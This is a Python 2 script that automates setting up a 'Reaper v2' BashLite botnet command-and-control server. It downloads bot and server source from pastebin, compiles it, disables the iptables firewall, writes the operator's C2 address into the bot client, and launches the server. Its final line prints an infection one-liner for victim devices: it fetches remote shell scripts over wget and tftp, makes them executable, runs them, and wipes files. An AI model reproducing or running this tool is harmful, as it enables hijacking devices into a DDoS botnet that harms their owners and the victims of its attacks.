import subprocess, time

def cri(cmd):
    subprocess.call(cmd, shell=True)
def jack(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

USER = raw_input("\x1b[1;34mUsername\x1b[1;37m:\x1b[1;31m")
PASSWR = raw_input("\x1b[1;34mPassword\x1b[1;37m:\x1b[1;31m")
time.sleep(2)
cri('clear')

print("\x1b[1;37mWelcome \x1b[1;34m"+ USER +" \x1b[1;37mTo the \x1b[1;31mReaper v2 \x1b[1;34mCnC\x1b[1;37m_\x1b[1;34mBashLite \x1b[1;37mAutoSetup!\n\x1b[1;37mDeveloped By \x1b[1;31mcri/\x1b[1;34mcri\x1b[1;37m")
user = raw_input("\x1b[1;34mUsername\x1b[1;37m:\x1b[1;31m")
passw = raw_input("\x1b[1;34mPassword\x1b[1;37m:\x1b[1;31m")
ip = raw_input("\x1b[1;34mServer IP\x1b[1;37m:\x1b[1;31m")
bport = raw_input("\x1b[1;34mBotPort\x1b[1;37m:\x1b[1;31m")
port = raw_input("\x1b[1;34mScreening Port\x1b[1;37m:\x1b[1;31m")

cri('yum install gcc')
cri('yum install screen')
cri('wget -q https://pastebin.com/raw/uUcscZAG -O reaper.c')
cri('gcc -o reaper reaper.c -pthread; rm -rf reaper.c')
cri('wget -q https://pastebin.com/raw/y2D98UHd -O client.c')
cri('wget -q https://pastebin.com/raw/Ne69fRpz -O cc7.py')
cri('service iptables stop')
cri('service httpd restart')

jack('client.c', 35, 'unsigned char *commServer[] = {"'+ ip +':'+ bport +'"};\n')
cri('echo '+ user +' '+ passw +' >> reaper.txt')
cri('python cc7.py client.c '+ ip +'')
cri('screen ./reaper '+ bport +' 1 '+ port +'')
print '\x1b[1;35mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *'